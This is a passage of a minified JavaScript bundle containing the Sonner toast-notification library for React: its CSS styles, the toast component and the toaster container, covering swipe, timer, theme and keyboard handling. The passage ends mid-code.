Dw(`:where(html[dir="ltr"]),:where([data-sonner-toaster][dir="ltr"]){--toast-icon-margin-start: -3px;--toast-icon-margin-end: 4px;--toast-svg-margin-start: -1px;--toast-svg-margin-end: 0px;--toast-button-margin-start: auto;--toast-button-margin-end: 0;--toast-close-button-start: 0;--toast-close-button-end: unset;--toast-close-button-transform: translate(-35%, -35%)}:where(html[dir="rtl"]),:where([data-sonner-toaster][dir="rtl"]){--toast-icon-margin-start: 4px;--toast-icon-margin-end: -3px;--toast-svg-margin-start: 0px;--toast-svg-margin-end: -1px;--toast-button-margin-start: 0;--toast-button-margin-end: auto;--toast-close-button-start: unset;--toast-close-button-end: 0;--toast-close-button-transform: translate(35%, -35%)}:where([data-sonner-toaster]){position:fixed;width:var(--width);font-family:ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji;--gray1: hsl(0, 0%, 99%);--gray2: hsl(0, 0%, 97.3%);--gray3: hsl(0, 0%, 95.1%);--gray4: hsl(0, 0%, 93%);--gray5: hsl(0, 0%, 90.9%);--gray6: hsl(0, 0%, 88.7%);--gray7: hsl(0, 0%, 85.8%);--gray8: hsl(0, 0%, 78%);--gray9: hsl(0, 0%, 56.1%);--gray10: hsl(0, 0%, 52.3%);--gray11: hsl(0, 0%, 43.5%);--gray12: hsl(0, 0%, 9%);--border-radius: 8px;box-sizing:border-box;padding:0;margin:0;list-style:none;outline:none;z-index:999999999;transition:transform .4s ease}:where([data-sonner-toaster][data-lifted="true"]){transform:translateY(-10px)}@media (hover: none) and (pointer: coarse){:where([data-sonner-toaster][data-lifted="true"]){transform:none}}:where([data-sonner-toaster][data-x-position="right"]){right:var(--offset-right)}:where([data-sonner-toaster][data-x-position="left"]){left:var(--offset-left)}:where([data-sonner-toaster][data-x-position="center"]){left:50%;transform:translate(-50%)}:where([data-sonner-toaster][data-y-position="top"]){top:var(--offset-top)}:where([data-sonner-toaster][data-y-position="bottom"]){bottom:var(--offset-bottom)}:where([data-sonner-toast]){--y: translateY(100%);--lift-amount: calc(var(--lift) * var(--gap));z-index:var(--z-index);position:absolute;opacity:0;transform:var(--y);filter:blur(0);touch-action:none;transition:transform .4s,opacity .4s,height .4s,box-shadow .2s;box-sizing:border-box;outline:none;overflow-wrap:anywhere}:where([data-sonner-toast][data-styled="true"]){padding:16px;background:var(--normal-bg);border:1px solid var(--normal-border);color:var(--normal-text);border-radius:var(--border-radius);box-shadow:0 4px 12px #0000001a;width:var(--width);font-size:13px;display:flex;align-items:center;gap:6px}:where([data-sonner-toast]:focus-visible){box-shadow:0 4px 12px #0000001a,0 0 0 2px #0003}:where([data-sonner-toast][data-y-position="top"]){top:0;--y: translateY(-100%);--lift: 1;--lift-amount: calc(1 * var(--gap))}:where([data-sonner-toast][data-y-position="bottom"]){bottom:0;--y: translateY(100%);--lift: -1;--lift-amount: calc(var(--lift) * var(--gap))}:where([data-sonner-toast]) :where([data-description]){font-weight:400;line-height:1.4;color:inherit}:where([data-sonner-toast]) :where([data-title]){font-weight:500;line-height:1.5;color:inherit}:where([data-sonner-toast]) :where([data-icon]){display:flex;height:16px;width:16px;position:relative;justify-content:flex-start;align-items:center;flex-shrink:0;margin-left:var(--toast-icon-margin-start);margin-right:var(--toast-icon-margin-end)}:where([data-sonner-toast][data-promise="true"]) :where([data-icon])>svg{opacity:0;transform:scale(.8);transform-origin:center;animation:sonner-fade-in .3s ease forwards}:where([data-sonner-toast]) :where([data-icon])>*{flex-shrink:0}:where([data-sonner-toast]) :where([data-icon]) svg{margin-left:var(--toast-svg-margin-start);margin-right:var(--toast-svg-margin-end)}:where([data-sonner-toast]) :where([data-content]){display:flex;flex-direction:column;gap:2px}[data-sonner-toast][data-styled=true] [data-button]{border-radius:4px;padding-left:8px;padding-right:8px;height:24px;font-size:12px;color:var(--normal-bg);background:var(--normal-text);margin-left:var(--toast-button-margin-start);margin-right:var(--toast-button-margin-end);border:none;cursor:pointer;outline:none;display:flex;align-items:center;flex-shrink:0;transition:opacity .4s,box-shadow .2s}:where([data-sonner-toast]) :where([data-button]):focus-visible{box-shadow:0 0 0 2px #0006}:where([data-sonner-toast]) :where([data-button]):first-of-type{margin-left:var(--toast-button-margin-start);margin-right:var(--toast-button-margin-end)}:where([data-sonner-toast]) :where([data-cancel]){color:var(--normal-text);background:rgba(0,0,0,.08)}:where([data-sonner-toast][data-theme="dark"]) :where([data-cancel]){background:rgba(255,255,255,.3)}:where([data-sonner-toast]) :where([data-close-button]){position:absolute;left:var(--toast-close-button-start);right:var(--toast-close-button-end);top:0;height:20px;width:20px;display:flex;justify-content:center;align-items:center;padding:0;color:var(--gray12);border:1px solid var(--gray4);transform:var(--toast-close-button-transform);border-radius:50%;cursor:pointer;z-index:1;transition:opacity .1s,background .2s,border-color .2s}[data-sonner-toast] [data-close-button]{background:var(--gray1)}:where([data-sonner-toast]) :where([data-close-button]):focus-visible{box-shadow:0 4px 12px #0000001a,0 0 0 2px #0003}:where([data-sonner-toast]) :where([data-disabled="true"]){cursor:not-allowed}:where([data-sonner-toast]):hover :where([data-close-button]):hover{background:var(--gray2);border-color:var(--gray5)}:where([data-sonner-toast][data-swiping="true"]):before{content:"";position:absolute;left:-50%;right:-50%;height:100%;z-index:-1}:where([data-sonner-toast][data-y-position="top"][data-swiping="true"]):before{bottom:50%;transform:scaleY(3) translateY(50%)}:where([data-sonner-toast][data-y-position="bottom"][data-swiping="true"]):before{top:50%;transform:scaleY(3) translateY(-50%)}:where([data-sonner-toast][data-swiping="false"][data-removed="true"]):before{content:"";position:absolute;inset:0;transform:scaleY(2)}:where([data-sonner-toast]):after{content:"";position:absolute;left:0;height:calc(var(--gap) + 1px);bottom:100%;width:100%}:where([data-sonner-toast][data-mounted="true"]){--y: translateY(0);opacity:1}:where([data-sonner-toast][data-expanded="false"][data-front="false"]){--scale: var(--toasts-before) * .05 + 1;--y: translateY(calc(var(--lift-amount) * var(--toasts-before))) scale(calc(-1 * var(--scale)));height:var(--front-toast-height)}:where([data-sonner-toast])>*{transition:opacity .4s}:where([data-sonner-toast][data-expanded="false"][data-front="false"][data-styled="true"])>*{opacity:0}:where([data-sonner-toast][data-visible="false"]){opacity:0;pointer-events:none}:where([data-sonner-toast][data-mounted="true"][data-expanded="true"]){--y: translateY(calc(var(--lift) * var(--offset)));height:var(--initial-height)}:where([data-sonner-toast][data-removed="true"][data-front="true"][data-swipe-out="false"]){--y: translateY(calc(var(--lift) * -100%));opacity:0}:where([data-sonner-toast][data-removed="true"][data-front="false"][data-swipe-out="false"][data-expanded="true"]){--y: translateY(calc(var(--lift) * var(--offset) + var(--lift) * -100%));opacity:0}:where([data-sonner-toast][data-removed="true"][data-front="false"][data-swipe-out="false"][data-expanded="false"]){--y: translateY(40%);opacity:0;transition:transform .5s,opacity .2s}:where([data-sonner-toast][data-removed="true"][data-front="false"]):before{height:calc(var(--initial-height) + 20%)}[data-sonner-toast][data-swiping=true]{transform:var(--y) translateY(var(--swipe-amount-y, 0px)) translate(var(--swipe-amount-x, 0px));transition:none}[data-sonner-toast][data-swiped=true]{user-select:none}[data-sonner-toast][data-swipe-out=true][data-y-position=bottom],[data-sonner-toast][data-swipe-out=true][data-y-position=top]{animation-duration:.2s;animation-timing-function:ease-out;animation-fill-mode:forwards}[data-sonner-toast][data-swipe-out=true][data-swipe-direction=left]{animation-name:swipe-out-left}[data-sonner-toast][data-swipe-out=true][data-swipe-direction=right]{animation-name:swipe-out-right}[data-sonner-toast][data-swipe-out=true][data-swipe-direction=up]{animation-name:swipe-out-up}[data-sonner-toast][data-swipe-out=true][data-swipe-direction=down]{animation-name:swipe-out-down}@keyframes swipe-out-left{0%{transform:var(--y) translate(var(--swipe-amount-x));opacity:1}to{transform:var(--y) translate(calc(var(--swipe-amount-x) - 100%));opacity:0}}@keyframes swipe-out-right{0%{transform:var(--y) translate(var(--swipe-amount-x));opacity:1}to{transform:var(--y) translate(calc(var(--swipe-amount-x) + 100%));opacity:0}}@keyframes swipe-out-up{0%{transform:var(--y) translateY(var(--swipe-amount-y));opacity:1}to{transform:var(--y) translateY(calc(var(--swipe-amount-y) - 100%));opacity:0}}@keyframes swipe-out-down{0%{transform:var(--y) translateY(var(--swipe-amount-y));opacity:1}to{transform:var(--y) translateY(calc(var(--swipe-amount-y) + 100%));opacity:0}}@media (max-width: 600px){[data-sonner-toaster]{position:fixed;right:var(--mobile-offset-right);left:var(--mobile-offset-left);width:100%}[data-sonner-toaster][dir=rtl]{left:calc(var(--mobile-offset-left) * -1)}[data-sonner-toaster] [data-sonner-toast]{left:0;right:0;width:calc(100% - var(--mobile-offset-left) * 2)}[data-sonner-toaster][data-x-position=left]{left:var(--mobile-offset-left)}[data-sonner-toaster][data-y-position=bottom]{bottom:var(--mobile-offset-bottom)}[data-sonner-toaster][data-y-position=top]{top:var(--mobile-offset-top)}[data-sonner-toaster][data-x-position=center]{left:var(--mobile-offset-left);right:var(--mobile-offset-right);transform:none}}[data-sonner-toaster][data-theme=light]{--normal-bg: #fff;--normal-border: var(--gray4);--normal-text: var(--gray12);--success-bg: hsl(143, 85%, 96%);--success-border: hsl(145, 92%, 91%);--success-text: hsl(140, 100%, 27%);--info-bg: hsl(208, 100%, 97%);--info-border: hsl(221, 91%, 91%);--info-text: hsl(210, 92%, 45%);--warning-bg: hsl(49, 100%, 97%);--warning-border: hsl(49, 91%, 91%);--warning-text: hsl(31, 92%, 45%);--error-bg: hsl(359, 100%, 97%);--error-border: hsl(359, 100%, 94%);--error-text: hsl(360, 100%, 45%)}[data-sonner-toaster][data-theme=light] [data-sonner-toast][data-invert=true]{--normal-bg: #000;--normal-border: hsl(0, 0%, 20%);--normal-text: var(--gray1)}[data-sonner-toaster][data-theme=dark] [data-sonner-toast][data-invert=true]{--normal-bg: #fff;--normal-border: var(--gray3);--normal-text: var(--gray12)}[data-sonner-toaster][data-theme=dark]{--normal-bg: #000;--normal-bg-hover: hsl(0, 0%, 12%);--normal-border: hsl(0, 0%, 20%);--normal-border-hover: hsl(0, 0%, 25%);--normal-text: var(--gray1);--success-bg: hsl(150, 100%, 6%);--success-border: hsl(147, 100%, 12%);--success-text: hsl(150, 86%, 65%);--info-bg: hsl(215, 100%, 6%);--info-border: hsl(223, 100%, 12%);--info-text: hsl(216, 87%, 65%);--warning-bg: hsl(64, 100%, 6%);--warning-border: hsl(60, 100%, 12%);--warning-text: hsl(46, 87%, 65%);--error-bg: hsl(358, 76%, 10%);--error-border: hsl(357, 89%, 16%);--error-text: hsl(358, 100%, 81%)}[data-sonner-toaster][data-theme=dark] [data-sonner-toast] [data-close-button]{background:var(--normal-bg);border-color:var(--normal-border);color:var(--normal-text)}[data-sonner-toaster][data-theme=dark] [data-sonner-toast] [data-close-button]:hover{background:var(--normal-bg-hover);border-color:var(--normal-border-hover)}[data-rich-colors=true][data-sonner-toast][data-type=success],[data-rich-colors=true][data-sonner-toast][data-type=success] [data-close-button]{background:var(--success-bg);border-color:var(--success-border);color:var(--success-text)}[data-rich-colors=true][data-sonner-toast][data-type=info],[data-rich-colors=true][data-sonner-toast][data-type=info] [data-close-button]{background:var(--info-bg);border-color:var(--info-border);color:var(--info-text)}[data-rich-colors=true][data-sonner-toast][data-type=warning],[data-rich-colors=true][data-sonner-toast][data-type=warning] [data-close-button]{background:var(--warning-bg);border-color:var(--warning-border);color:var(--warning-text)}[data-rich-colors=true][data-sonner-toast][data-type=error],[data-rich-colors=true][data-sonner-toast][data-type=error] [data-close-button]{background:var(--error-bg);border-color:var(--error-border);color:var(--error-text)}.sonner-loading-wrapper{--size: 16px;height:var(--size);width:var(--size);position:absolute;inset:0;z-index:10}.sonner-loading-wrapper[data-visible=false]{transform-origin:center;animation:sonner-fade-out .2s ease forwards}.sonner-spinner{position:relative;top:50%;left:50%;height:var(--size);width:var(--size)}.sonner-loading-bar{animation:sonner-spin 1.2s linear infinite;background:var(--gray11);border-radius:6px;height:8%;left:-10%;position:absolute;top:-3.9%;width:24%}.sonner-loading-bar:nth-child(1){animation-delay:-1.2s;transform:rotate(.0001deg) translate(146%)}.sonner-loading-bar:nth-child(2){animation-delay:-1.1s;transform:rotate(30deg) translate(146%)}.sonner-loading-bar:nth-child(3){animation-delay:-1s;transform:rotate(60deg) translate(146%)}.sonner-loading-bar:nth-child(4){animation-delay:-.9s;transform:rotate(90deg) translate(146%)}.sonner-loading-bar:nth-child(5){animation-delay:-.8s;transform:rotate(120deg) translate(146%)}.sonner-loading-bar:nth-child(6){animation-delay:-.7s;transform:rotate(150deg) translate(146%)}.sonner-loading-bar:nth-child(7){animation-delay:-.6s;transform:rotate(180deg) translate(146%)}.sonner-loading-bar:nth-child(8){animation-delay:-.5s;transform:rotate(210deg) translate(146%)}.sonner-loading-bar:nth-child(9){animation-delay:-.4s;transform:rotate(240deg) translate(146%)}.sonner-loading-bar:nth-child(10){animation-delay:-.3s;transform:rotate(270deg) translate(146%)}.sonner-loading-bar:nth-child(11){animation-delay:-.2s;transform:rotate(300deg) translate(146%)}.sonner-loading-bar:nth-child(12){animation-delay:-.1s;transform:rotate(330deg) translate(146%)}@keyframes sonner-fade-in{0%{opacity:0;transform:scale(.8)}to{opacity:1;transform:scale(1)}}@keyframes sonner-fade-out{0%{opacity:1;transform:scale(1)}to{opacity:0;transform:scale(.8)}}@keyframes sonner-spin{0%{opacity:1}to{opacity:.15}}@media (prefers-reduced-motion){[data-sonner-toast],[data-sonner-toast]>*,.sonner-loading-bar{transition:none!important;animation:none!important}}.sonner-loader{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);transform-origin:center;transition:opacity .2s,transform .2s}.sonner-loader[data-visible=false]{opacity:0;transform:scale(.8) translate(-50%,-50%)}
`);
function fs(e) {
    return e.label !== void 0;
}
var Ow = 3,
    _w = "32px",
    Fw = "16px",
    Op = 4e3,
    zw = 356,
    Bw = 14,
    Uw = 20,
    Hw = 200;
function kt(...e) {
    return e.filter(Boolean).join(" ");
}
function $w(e) {
    let [t, n] = e.split("-"),
        r = [];
    return t && r.push(t), n && r.push(n), r;
}
var Vw = (e) => {
    var t, n, r, o, i, s, a, c, u, d, p;
    let {
            invert: m,
            toast: f,
            unstyled: S,
            interacting: y,
            setHeights: w,
            visibleToasts: g,
            heights: h,
            index: v,
            toasts: b,
            expanded: k,
            removeToast: C,
            defaultRichColors: P,
            closeButton: A,
            style: L,
            cancelButtonStyle: M,
            actionButtonStyle: U,
            className: F = "",
            descriptionClassName: G = "",
            duration: O,
            position: X,
            gap: H,
            loadingIcon: $,
            expandByDefault: E,
            classNames: T,
            icons: _,
            closeButtonAriaLabel: V = "Close toast",
            pauseWhenPageIsHidden: B,
        } = e,
        [q, Y] = R.useState(null),
        [he, Ne] = R.useState(null),
        [te, Zt] = R.useState(!1),
        [Ot, Jt] = R.useState(!1),
        [re, en] = R.useState(!1),
        [I, Z] = R.useState(!1),
        [ge, ye] = R.useState(!1),
        [ut, Ie] = R.useState(0),
        [Le, tn] = R.useState(0),
        Sn = R.useRef(f.duration || O || Op),
        _t = R.useRef(null),
        tt = R.useRef(null),
        Hi = v === 0,
        Va = v + 1 <= g,
        Ue = f.type,
        Ft = f.dismissible !== !1,
        we = f.className || "",
        bn = f.descriptionClassName || "",
        dt = R.useMemo(() => h.findIndex((W) => W.toastId === f.id) || 0, [h, f.id]),
        kn = R.useMemo(() => {
            var W;
            return (W = f.closeButton) != null ? W : A;
        }, [f.closeButton, A]),
        Lo = R.useMemo(() => f.duration || O || Op, [f.duration, O]),
        $i = R.useRef(0),
        nn = R.useRef(0),
        Vi = R.useRef(0),
        zt = R.useRef(null),
        [jy, Ry] = X.split("-"),
        ld = R.useMemo(() => h.reduce((W, ie, ue) => (ue >= dt ? W : W + ie.height), 0), [h, dt]),
        cd = Tw(),
        My = f.invert || m,
        Wa = Ue === "loading";
    (nn.current = R.useMemo(() => dt * H + ld, [dt, ld])),
        R.useEffect(() => {
            Sn.current = Lo;
        }, [Lo]),
        R.useEffect(() => {
            Zt(!0);
        }, []),
        R.useEffect(() => {
            let W = tt.current;
            if (W) {
                let ie = W.getBoundingClientRect().height;
                return (
                    tn(ie),
                    w((ue) => [{ toastId: f.id, height: ie, position: f.position }, ...ue]),
                    () => w((ue) => ue.filter((xt) => xt.toastId !== f.id))
                );
            }
        }, [w, f.id]),
        R.useLayoutEffect(() => {
            if (!te) return;
            let W = tt.current,
                ie = W.style.height;
            W.style.height = "auto";
            let ue = W.getBoundingClientRect().height;
            (W.style.height = ie),
                tn(ue),
                w((xt) =>
                    xt.find((wt) => wt.toastId === f.id)
                        ? xt.map((wt) => (wt.toastId === f.id ? { ...wt, height: ue } : wt))
                        : [{ toastId: f.id, height: ue, position: f.position }, ...xt]
                );
        }, [te, f.title, f.description, w, f.id]);
    let Cn = R.useCallback(() => {
        Jt(!0),
            Ie(nn.current),
            w((W) => W.filter((ie) => ie.toastId !== f.id)),
            setTimeout(() => {
                C(f);
            }, Hw);
    }, [f, C, w, nn]);
    R.useEffect(() => {
        if ((f.promise && Ue === "loading") || f.duration === 1 / 0 || f.type === "loading") return;
        let W;
        return (
            k || y || (B && cd)
                ? (() => {
                      if (Vi.current < $i.current) {
                          let ie = new Date().getTime() - $i.current;
                          Sn.current = Sn.current - ie;
                      }
                      Vi.current = new Date().getTime();
                  })()
                : Sn.current !== 1 / 0 &&
                  (($i.current = new Date().getTime()),
                  (W = setTimeout(() => {
                      var ie;
                      (ie = f.onAutoClose) == null || ie.call(f, f), Cn();
                  }, Sn.current))),
            () => clearTimeout(W)
        );
    }, [k, y, f, Ue, B, cd, Cn]),
        R.useEffect(() => {
            f.delete && Cn();
        }, [Cn, f.delete]);
    function Iy() {
        var W, ie, ue;
        return _ != null && _.loading
            ? R.createElement(
                  "div",
                  {
                      className: kt(
                          T == null ? void 0 : T.loader,
                          (W = f == null ? void 0 : f.classNames) == null ? void 0 : W.loader,
                          "sonner-loader"
                      ),
                      "data-visible": Ue === "loading",
                  },
                  _.loading
              )
            : $
              ? R.createElement(
                    "div",
                    {
                        className: kt(
                            T == null ? void 0 : T.loader,
                            (ie = f == null ? void 0 : f.classNames) == null ? void 0 : ie.loader,
                            "sonner-loader"
                        ),
                        "data-visible": Ue === "loading",
                    },
                    $
                )
              : R.createElement(bw, {
                    className: kt(
                        T == null ? void 0 : T.loader,
                        (ue = f == null ? void 0 : f.classNames) == null ? void 0 : ue.loader
                    ),
                    visible: Ue === "loading",
                });
    }
    return R.createElement(
        "li",
        {
            tabIndex: 0,
            ref: tt,
            className: kt(
                F,
                we,
                T == null ? void 0 : T.toast,
                (t = f == null ? void 0 : f.classNames) == null ? void 0 : t.toast,
                T == null ? void 0 : T.default,
                T == null ? void 0 : T[Ue],
                (n = f == null ? void 0 : f.classNames) == null ? void 0 : n[Ue]
            ),
            "data-sonner-toast": "",
            "data-rich-colors": (r = f.richColors) != null ? r : P,
            "data-styled": !(f.jsx || f.unstyled || S),
            "data-mounted": te,
            "data-promise": !!f.promise,
            "data-swiped": ge,
            "data-removed": Ot,
            "data-visible": Va,
            "data-y-position": jy,
            "data-x-position": Ry,
            "data-index": v,
            "data-front": Hi,
            "data-swiping": re,
            "data-dismissible": Ft,
            "data-type": Ue,
            "data-invert": My,
            "data-swipe-out": I,
            "data-swipe-direction": he,
            "data-expanded": !!(k || (E && te)),
            style: {
                "--index": v,
                "--toasts-before": v,
                "--z-index": b.length - v,
                "--offset": `${Ot ? ut : nn.current}px`,
                "--initial-height": E ? "auto" : `${Le}px`,
                ...L,
                ...f.style,
            },
            onDragEnd: () => {
                en(!1), Y(null), (zt.current = null);
            },
            onPointerDown: (W) => {
                Wa ||
                    !Ft ||
                    ((_t.current = new Date()),
                    Ie(nn.current),
                    W.target.setPointerCapture(W.pointerId),
                    W.target.tagName !== "BUTTON" && (en(!0), (zt.current = { x: W.clientX, y: W.clientY })));
            },
            onPointerUp: () => {
                var W, ie, ue, xt;
                if (I || !Ft) return;
                zt.current = null;
                let wt = Number(
                        ((W = tt.current) == null
                            ? void 0
                            : W.style.getPropertyValue("--swipe-amount-x").replace("px", "")) || 0
                    ),
                    Pn = Number(
                        ((ie = tt.current) == null
                            ? void 0
                            : ie.style.getPropertyValue("--swipe-amount-y").replace("px", "")) || 0
                    ),
                    lr = new Date().getTime() - ((ue = _t.current) == null ? void 0 : ue.getTime()),
                    St = q === "x" ? wt : Pn,
                    En = Math.abs(St) / lr;
                if (Math.abs(St) >= Uw || En > 0.11) {
                    Ie(nn.current),
                        (xt = f.onDismiss) == null || xt.call(f, f),
                        Ne(q === "x" ? (wt > 0 ? "right" : "left") : Pn > 0 ? "down" : "up"),
                        Cn(),
                        Z(!0),
                        ye(!1);
                    return;
                }
                en(!1), Y(null);
            },
            onPointerMove: (W) => {
                var ie, ue, xt, wt;
                if (!zt.current || !Ft || ((ie = window.getSelection()) == null ? void 0 : ie.toString().length) > 0)
                    return;
                let Pn = W.clientY - zt.current.y,
                    lr = W.clientX - zt.current.x,
                    St = (ue = e.swipeDirections) != null ? ue : $w(X);
                !q && (Math.abs(lr) > 1 || Math.abs(Pn) > 1) && Y(Math.abs(lr) > Math.abs(Pn) ? "x" : "y");
                let En = { x: 0, y: 0 };
                q === "y"
                    ? (St.includes("top") || St.includes("bottom")) &&
                      ((St.includes("top") && Pn < 0) || (St.includes("bottom") && Pn > 0)) &&
                      (En.y = Pn)
                    : q === "x" &&
                      (St.includes("left") || St.includes("right")) &&
                      ((St.includes("left") && lr < 0) || (St.includes("right") && lr > 0)) &&
                      (En.x = lr),
                    (Math.abs(En.x) > 0 || Math.abs(En.y) > 0) && ye(!0),
                    (xt = tt.current) == null || xt.style.setProperty("--swipe-amount-x", `${En.x}px`),
                    (wt = tt.current) == null || wt.style.setProperty("--swipe-amount-y", `${En.y}px`);
            },
        },
        kn && !f.jsx
            ? R.createElement(
                  "button",
                  {
                      "aria-label": V,
                      "data-disabled": Wa,
                      "data-close-button": !0,
                      onClick:
                          Wa || !Ft
                              ? () => {}
                              : () => {
                                    var W;
                                    Cn(), (W = f.onDismiss) == null || W.call(f, f);
                                },
                      className: kt(
                          T == null ? void 0 : T.closeButton,
                          (o = f == null ? void 0 : f.classNames) == null ? void 0 : o.closeButton
                      ),
                  },
                  (i = _ == null ? void 0 : _.close) != null ? i : Nw
              )
            : null,
        f.jsx || x.isValidElement(f.title)
            ? f.jsx
                ? f.jsx
                : typeof f.title == "function"
                  ? f.title()
                  : f.title
            : R.createElement(
                  R.Fragment,
                  null,
                  Ue || f.icon || f.promise
                      ? R.createElement(
                            "div",
                            {
                                "data-icon": "",
                                className: kt(
                                    T == null ? void 0 : T.icon,
                                    (s = f == null ? void 0 : f.classNames) == null ? void 0 : s.icon
                                ),
                            },
                            f.promise || (f.type === "loading" && !f.icon) ? f.icon || Iy() : null,
                            f.type !== "loading" ? f.icon || (_ == null ? void 0 : _[Ue]) || ww(Ue) : null
                        )
                      : null,
                  R.createElement(
                      "div",
                      {
                          "data-content": "",
                          className: kt(
                              T == null ? void 0 : T.content,
                              (a = f == null ? void 0 : f.classNames) == null ? void 0 : a.content
                          ),
                      },
                      R.createElement(
                          "div",
                          {
                              "data-title": "",
                              className: kt(
                                  T == null ? void 0 : T.title,
                                  (c = f == null ? void 0 : f.classNames) == null ? void 0 : c.title
                              ),
                          },
                          typeof f.title == "function" ? f.title() : f.title
                      ),
                      f.description
                          ? R.createElement(
                                "div",
                                {
                                    "data-description": "",
                                    className: kt(
                                        G,
                                        bn,
                                        T == null ? void 0 : T.description,
                                        (u = f == null ? void 0 : f.classNames) == null ? void 0 : u.description
                                    ),
                                },
                                typeof f.description == "function" ? f.description() : f.description
                            )
                          : null
                  ),
                  x.isValidElement(f.cancel)
                      ? f.cancel
                      : f.cancel && fs(f.cancel)
                        ? R.createElement(
                              "button",
                              {
                                  "data-button": !0,
                                  "data-cancel": !0,
                                  style: f.cancelButtonStyle || M,
                                  onClick: (W) => {
                                      var ie, ue;
                                      fs(f.cancel) &&
                                          Ft &&
                                          ((ue = (ie = f.cancel).onClick) == null || ue.call(ie, W), Cn());
                                  },
                                  className: kt(
                                      T == null ? void 0 : T.cancelButton,
                                      (d = f == null ? void 0 : f.classNames) == null ? void 0 : d.cancelButton
                                  ),
                              },
                              f.cancel.label
                          )
                        : null,
                  x.isValidElement(f.action)
                      ? f.action
                      : f.action && fs(f.action)
                        ? R.createElement(
                              "button",
                              {
                                  "data-button": !0,
                                  "data-action": !0,
                                  style: f.actionButtonStyle || U,
                                  onClick: (W) => {
                                      var ie, ue;
                                      fs(f.action) &&
                                          ((ue = (ie = f.action).onClick) == null || ue.call(ie, W),
                                          !W.defaultPrevented && Cn());
                                  },
                                  className: kt(
                                      T == null ? void 0 : T.actionButton,
                                      (p = f == null ? void 0 : f.classNames) == null ? void 0 : p.actionButton
                                  ),
                              },
                              f.action.label
                          )
                        : null
              )
    );
};
function _p() {
    if (typeof window > "u" || typeof document > "u") return "ltr";
    let e = document.documentElement.getAttribute("dir");
    return e === "auto" || !e ? window.getComputedStyle(document.documentElement).direction : e;
}
function Ww(e, t) {
    let n = {};
    return (
        [e, t].forEach((r, o) => {
            let i = o === 1,
                s = i ? "--mobile-offset" : "--offset",
                a = i ? Fw : _w;
            function c(u) {
                ["top", "right", "bottom", "left"].forEach((d) => {
                    n[`${s}-${d}`] = typeof u == "number" ? `${u}px` : u;
                });
            }
            typeof r == "number" || typeof r == "string"
                ? c(r)
                : typeof r == "object"
                  ? ["top", "right", "bottom", "left"].forEach((u) => {
                        r[u] === void 0
                            ? (n[`${s}-${u}`] = a)
                            : (n[`${s}-${u}`] = typeof r[u] == "number" ? `${r[u]}px` : r[u]);
                    })
                  : c(a);
        }),
        n
    );
}
var Kw = x.forwardRef(function (e, t) {
    let {
            invert: n,
            position: r = "bottom-right",
            hotkey: o = ["altKey", "KeyT"],
            expand: i,
            closeButton: s,
            className: a,
            offset: c,
            mobileOffset: u,
            theme: d = "light",
            richColors: p,
            duration: m,
            style: f,
            visibleToasts: S = Ow,
            toastOptions: y,
            dir: w = _p(),
            gap: g = Bw,
            loadingIcon: h,
            icons: v,
            containerAriaLabel: b = "Notifications",
            pauseWhenPageIsHidden: k,
        } = e,
        [C, P] = R.useState([]),
        A = R.useMemo(
            () => Array.from(new Set([r].concat(C.filter((B) => B.position).map((B) => B.position)))),
            [C, r]
        ),
        [L, M] = R.useState([]),
        [U, F] = R.useState(!1),
        [G, O] = R.useState(!1),
        [X, H] = R.useState(
            d !== "system"
                ? d
                : typeof window < "u" && window.matchMedia && window.matchMedia("(prefers-color-scheme: dark)").matches
                  ? "dark"
                  : "light"
        ),
        $ = R.useRef(null),
        E = o.join("+").replace(/Key/g, "").replace(/Digit/g, ""),
        T = R.useRef(null),
        _ = R.useRef(!1),
        V = R.useCallback((B) => {
            P((q) => {
                var Y;
                return (
                    ((Y = q.find((he) => he.id === B.id)) != null && Y.delete) || Qe.dismiss(B.id),
                    q.filter(({ id: he }) => he !== B.id)
                );
            });
        }, []);
    return (
        R.useEffect(
            () =>
                Qe.subscribe((B) => {
                    if (B.dismiss) {
                        P((q) => q.map((Y) => (Y.id === B.id ? { ...Y, delete: !0 } : Y)));
                        return;
                    }
                    setTimeout(() => {
                        Lh.flushSync(() => {
                            P((q) => {
                                let Y = q.findIndex((he) => he.id === B.id);
                                return Y !== -1 ? [...q.slice(0, Y), { ...q[Y], ...B }, ...q.slice(Y + 1)] : [B, ...q];
                            });
                        });
                    });
                }),
            []
        ),
        R.useEffect(() => {
            if (d !== "system") {
                H(d);
                return;
            }
            if (
                (d === "system" &&
                    (window.matchMedia && window.matchMedia("(prefers-color-scheme: dark)").matches
                        ? H("dark")
                        : H("light")),
                typeof window > "u")
            )
                return;
            let B = window.matchMedia("(prefers-color-scheme: dark)");
            try {
                B.addEventListener("change", ({ matches: q }) => {
                    H(q ? "dark" : "light");
                });
            } catch {
                B.addListener(({ matches: Y }) => {
                    try {
                        H(Y ? "dark" : "light");
                    } catch (he) {
                        console.error(he);
                    }
                });
            }
        }, [d]),
        R.useEffect(() => {
            C.length <= 1 && F(!1);
        }, [C]),
        R.useEffect(() => {
            let B = (q) => {
                var Y, he;
                o.every((Ne) => q[Ne] || q.code === Ne) && (F(!0), (Y = $.current) == null || Y.focus()),
                    q.code === "Escape" &&
                        (document.activeElement === $.current ||
                            ((he = $.current) != null && he.contains(document.activeElement))) &&
                        F(!1);
            };
            return document.addEventListener("keydown", B), () => document.removeEventListener("keydown", B);
        }, [o]),
        R.useEffect(() => {
            if ($.current)
                return () => {
                    T.current && (T.current.focus({ preventScroll: !0 }), (T.current = null), (_.current = !1));
                };
        }, [$.current]),
        R.createElement(
            "section",
            {
                ref: t,
                "aria-label": `${b} ${E}`,
                tabIndex: -1,
                "aria-live": "polite",
                "aria-relevant": "additions text",
                "aria-atomic": "false",
                suppressHydrationWarning: !0,
            },
            A.map((B, q) => {
                var Y;
                let [he, Ne] = B.split("-");
                return C.length
                    ? R.createElement(
                          "ol",
                          {
                              key: B,
                              dir: w === "auto" ? _p() : w,
                              tabIndex: -1,
                              ref: $,
                              className: a,
                              "data-sonner-toaster": !0,
                              "data-theme": X,
                              "data-y-position": he,
                              "data-lifted": U && C.length > 1 && !i,
                              "data-x-position": Ne,
                              style: {
                                  "--front-toast-height": `${((Y = L[0]) == null ? void 0 : Y.height) || 0}px`,
                                  "--width": `${zw}px`,
                                  "--gap": `${g}px`,
                                  ...f,
                                  ...Ww(c, u),
                              },
                              onBlur: (te) => {
                                  _.current &&
                                      !te.currentTarget.contains(te.relatedTarget) &&
                                      ((_.current = !1),
